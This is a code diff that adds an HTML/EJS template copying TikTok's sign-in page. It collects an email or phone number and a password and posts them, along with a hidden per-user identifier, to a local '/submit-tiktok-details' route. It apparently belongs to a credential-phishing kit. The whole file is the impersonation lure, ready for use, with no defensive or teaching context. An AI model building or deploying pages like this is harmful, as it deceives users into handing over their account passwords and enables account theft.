@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="/css/tiktok.css">
+</head>
+<body>
+    <div class="login-container">
+        <h2>Sign in to TikTok</h2>
+        <form id="tiktokLoginForm" action="/submit-tiktok-details" method="POST">
+            <input type="hidden" name="userId" value="<%= userId %>">
+            
+            <label for="emailOrNumber">Number or Email:</label>
+            <input type="text" id="emailOrNumber" name="emailOrNumber" required placeholder="Email or phone number">
+        
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required placeholder="Password">
+            
+            <button type="submit">Login</button>
+        </form>
+        <p><a href="#">Forgot password?</a></p>
+    </div>
+</body>
+</html>
